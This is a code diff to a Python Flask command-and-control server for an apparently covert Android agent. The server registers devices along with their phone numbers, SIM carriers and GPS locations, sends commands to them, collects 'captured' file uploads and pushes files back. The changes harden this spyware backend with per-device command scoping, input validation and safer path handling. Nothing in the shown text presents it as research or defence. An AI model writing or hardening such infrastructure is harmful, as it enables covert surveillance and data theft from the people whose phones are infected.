@@ -1,27 +1,43 @@
-"""Endpoints consumed by the Android agent."""
+"""Endpoints consumed by the Android agent.
+
+Agents authenticate with the shared key in ``X-Api-Key``. Every handler that
+touches a device is scoped to the device id in the request body, so a leaked
+or guessed key cannot reach other devices' commands.
+"""
 
 import json
 import os
 import uuid
-from datetime import datetime
+
 from flask import Blueprint, request, jsonify, send_file
 
-from database import db
-from models import Device, Command, CapturedFile, LogEntry
 from config import Config
-from c2.command_builder import COMMAND_CATALOG
-from c2.file_handler import persist_upload
+from c2.auth import agent_key_ok
+from c2.file_handler import persist_upload, safe_join
+from c2.timeutil import utcnow
 from c2.ws_dashboard import broadcast
+from database import db
+from models import CapturedFile, Command, Device, LogEntry
 
 agent_api = Blueprint("agent_api", __name__, url_prefix="/api/agent")
 
+RESULT_MAX_CHARS = 512 * 1024
+LOG_MAX_CHARS = 4096
+
 
 def _auth():
-    return request.headers.get("X-Api-Key", "") == Config.API_KEY
+    return agent_key_ok(request.headers.get("X-Api-Key"))
 
 
 def _get_device(device_id):
+    if not device_id or not isinstance(device_id, str):
+        return None
     return Device.query.filter_by(device_id=device_id).first()
+
+
+def _payload():
+    data = request.get_json(silent=True)
+    return data if isinstance(data, dict) else {}
 
 
 @agent_api.route("/register", methods=["POST"])
@@ -29,32 +45,43 @@ def register():
     if not _auth():
         return jsonify({"error": "unauthorized"}), 401
 
-    data = request.get_json(force=True)
+    data = _payload()
     device_id = data.get("device_id") or str(uuid.uuid4())
 
     dev = _get_device(device_id)
     if not dev:
         dev = Device(device_id=device_id)
         db.session.add(dev)
+        dev.first_seen = utcnow()
 
     dev.model = data.get("model", dev.model)
     dev.manufacturer = data.get("manufacturer", dev.manufacturer)
     dev.android_version = data.get("android_version", dev.android_version)
-    dev.sdk_int = data.get("sdk_int", dev.sdk_int)
+    sdk = data.get("sdk_int")
+    if sdk is not None:
+        try:
+            dev.sdk_int = int(sdk)
+        except (TypeError, ValueError):
+            pass
     dev.hostname = data.get("hostname", dev.hostname)
     dev.ip_address = request.remote_addr
-    dev.battery = data.get("battery", dev.battery)
+    battery = data.get("battery")
+    if battery is not None:
+        try:
+            dev.battery = int(battery)
+        except (TypeError, ValueError):
+            pass
     dev.is_charging = bool(data.get("is_charging", dev.is_charging))
     dev.screen_on = bool(data.get("screen_on", dev.screen_on))
     dev.is_admin = bool(data.get("is_admin", dev.is_admin))
     dev.sim_operator = data.get("sim_operator", dev.sim_operator)
     dev.phone_number = data.get("phone_number", dev.phone_number)
-    dev.last_seen = datetime.utcnow()
+    dev.last_seen = utcnow()
     dev.is_online = True
 
-    if data.get("latitude") and data.get("longitude"):
-        dev.latitude = data["latitude"]
-        dev.longitude = data["longitude"]
+    if data.get("latitude") is not None and data.get("longitude") is not None:
+        dev.latitude = _as_float(data.get("latitude"))
+        dev.longitude = _as_float(data.get("longitude"))
         dev.country = data.get("country", dev.country)
         dev.city = data.get("city", dev.city)
 
@@ -63,33 +90,47 @@ def register():
     return jsonify({"ok": True, "device_id": device_id})
 
 
+def _as_float(value):
+    try:
+        return float(value)
+    except (TypeError, ValueError):
+        return 0.0
+
+
 @agent_api.route("/poll", methods=["POST"])
 def poll():
     if not _auth():
         return jsonify({"error": "unauthorized"}), 401
 
-    data = request.get_json(force=True)
+    data = _payload()
     dev = _get_device(data.get("device_id"))
     if not dev:
         return jsonify({"error": "unknown_device"}), 404
 
-    dev.last_seen = datetime.utcnow()
+    dev.last_seen = utcnow()
     dev.is_online = True
-    dev.battery = data.get("battery", dev.battery)
+    battery = data.get("battery")
+    if battery is not None:
+        try:
+            dev.battery = int(battery)
+        except (TypeError, ValueError):
+            pass
     dev.is_charging = bool(data.get("is_charging", dev.is_charging))
     dev.screen_on = bool(data.get("screen_on", dev.screen_on))
-    if data.get("latitude") and data.get("longitude"):
-        dev.latitude = data["latitude"]
-        dev.longitude = data["longitude"]
+    if data.get("latitude") is not None and data.get("longitude") is not None:
+        dev.latitude = _as_float(data.get("latitude"))
+        dev.longitude = _as_float(data.get("longitude"))
     db.session.commit()
 
-    pending = Command.query.filter_by(device_id=dev.id, status="pending").limit(20).all()
+    pending = (Command.query.filter_by(device_id=dev.id, status="pending")
+               .order_by(Command.id.asc()).limit(20).all())
     for c in pending:
         c.status = "sent"
-        c.delivered_at = datetime.utcnow()
+        c.delivered_at = utcnow()
     db.session.commit()
 
     broadcast("device_update", dev.to_dict())
+    broadcast("device_update", dev.to_dict(), room="all_devices")
 
     return jsonify({
         "commands": [
@@ -104,14 +145,27 @@ def result():
     if not _auth():
         return jsonify({"error": "unauthorized"}), 401
 
-    data = request.get_json(force=True)
-    cmd = Command.query.get(data.get("command_id"))
-    if not cmd:
+    data = _payload()
+    dev = _get_device(data.get("device_id"))
+    if not dev:
+        return jsonify({"error": "unknown_device"}), 404
+
+    raw_id = data.get("command_id")
+    if raw_id is None:
+        return jsonify({"error": "missing_command_id"}), 400
+    try:
+        cmd_id = int(raw_id)
+    except (TypeError, ValueError):
+        return jsonify({"error": "bad_command_id"}), 400
+
+    cmd = db.session.get(Command, cmd_id)
+    # Scope check: sequential ids mean "does it exist" is not enough.
+    if not cmd or cmd.device_id != dev.id:
         return jsonify({"error": "unknown_command"}), 404
 
-    cmd.result = json.dumps(data.get("result", {}))[:1024 * 512]
+    cmd.result = json.dumps(data.get("result", {}))[:RESULT_MAX_CHARS]
     cmd.status = "done" if data.get("success") else "failed"
-    cmd.completed_at = datetime.utcnow()
+    cmd.completed_at = utcnow()
     db.session.commit()
 
     broadcast("command_result", cmd.to_dict())
@@ -125,8 +179,8 @@ def upload():
 
     device_id = request.form.get("device_id")
     category = request.form.get("category", "misc")
-    command_id_raw = request.form.get("command_id")
-    command_id = int(command_id_raw) if command_id_raw and command_id_raw.isdigit() else None
+    raw_cmd = request.form.get("command_id")
+    command_id = int(raw_cmd) if raw_cmd and raw_cmd.isdigit() else None
     file = request.files.get("file")
     if not file or not device_id:
         return jsonify({"error": "bad_request"}), 400
@@ -134,6 +188,12 @@ def upload():
     dev = _get_device(device_id)
     if not dev:
         return jsonify({"error": "unknown_device"}), 404
+
+    # Only attribute the upload to a command that actually belongs here.
+    if command_id is not None:
+        cmd = db.session.get(Command, command_id)
+        if not cmd or cmd.device_id != dev.id:
+            command_id = None
 
     cf = persist_upload(
         device=dev,
@@ -148,8 +208,10 @@ def upload():
         },
     )
 
-    broadcast("new_file", cf.to_dict(), room="all_devices")
-    broadcast("new_file", cf.to_dict(), room=f"device_{dev.id}")
+    payload = cf.to_dict()
+    broadcast("new_file", payload)
+    broadcast("new_file", payload, room="all_devices")
+    broadcast("new_file", payload, room=f"device_{dev.id}")
 
     return jsonify({"ok": True, "file_id": cf.id, "url": f"/api/file/{cf.id}/raw"})
 
@@ -159,12 +221,13 @@ def log():
     if not _auth():
         return jsonify({"error": "unauthorized"}), 401
 
-    data = request.get_json(force=True)
+    data = _payload()
     dev = _get_device(data.get("device_id"))
     entry = LogEntry(
         device_id=dev.id if dev else None,
-        level=data.get("level", "info"),
-        message=data.get("message", ""),
+        level=str(data.get("level", "info"))[:16],
+        message=str(data.get("message", ""))[:LOG_MAX_CHARS],
+        created_at=utcnow(),
     )
     db.session.add(entry)
     db.session.commit()
@@ -177,10 +240,13 @@ def log():
 def download(filename):
     if not _auth():
         return jsonify({"error": "unauthorized"}), 401
-    base = os.path.join(Config.UPLOAD_FOLDER, "to_agent")
-    safe = os.path.normpath(os.path.join(base, filename))
-    if not safe.startswith(base):
+
+    try:
+        safe = safe_join(Config.UPLOAD_FOLDER, "to_agent", filename)
+    except ValueError:
         return jsonify({"error": "forbidden"}), 403
-    if not os.path.exists(safe):
+
+    if not safe.is_file():
         return jsonify({"error": "not_found"}), 404
-    return send_file(safe, as_attachment=True)
+
+    return send_file(str(safe), as_attachment=True, download_name=safe.name)
